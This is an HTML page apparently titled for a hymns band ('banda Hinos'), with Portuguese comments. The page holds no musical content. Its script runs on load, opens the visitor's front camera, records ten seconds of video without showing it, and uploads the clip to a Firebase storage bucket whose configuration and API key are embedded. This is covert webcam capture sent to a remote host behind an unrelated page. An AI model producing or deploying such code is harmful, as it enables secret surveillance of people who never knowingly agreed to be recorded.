<body>
    <h1>banda Hinos</h1>
    
    <div id="uploadMessage" class="message"></div>

    <script type="module">
        // Importar funções necessárias do SDK do Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-storage.js";

        // Configuração do Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBTScqXDpBvkkF4dZWf_9ZbjLVE9nGNZWU",
            authDomain: "dados-56d31.firebaseapp.com",
            projectId: "dados-56d31",
            storageBucket: "dados-56d31.appspot.com",
            messagingSenderId: "421767896706",
            appId: "1:421767896706:web:f41ece96eb20b09acd1e9b"
        };

        // Inicializar Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Solicitar a câmera frontal
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = event => {
                    chunks.push(event.data);
                };

                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const fileName = `video_${Date.now()}.webm`;
                    const storageRef = ref(storage, `videos/${fileName}`);

                    uploadBytes(storageRef, blob).then(snapshot => {
                        console.log('Vídeo enviado:', snapshot);
                        getDownloadURL(snapshot.ref).then(downloadURL => {
                            console.log('Vídeo disponível em:', downloadURL);
                            document.getElementById('uploadMessage').textContent = "Vídeo gravado e enviado com sucesso!";
                        });
                    }).catch(error => {
                        console.error('Erro ao enviar:', error);
                        document.getElementById('uploadMessage').textContent = "Erro ao enviar o vídeo: " + error.message;
                    });

                    chunks = [];
                };

                mediaRecorder.start();

                // Para após 10 segundos
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 10000); // 10 segundos
            })
            .catch(error => {
                console.error("Erro ao acessar a câmera: ", error);
            });
    </script>
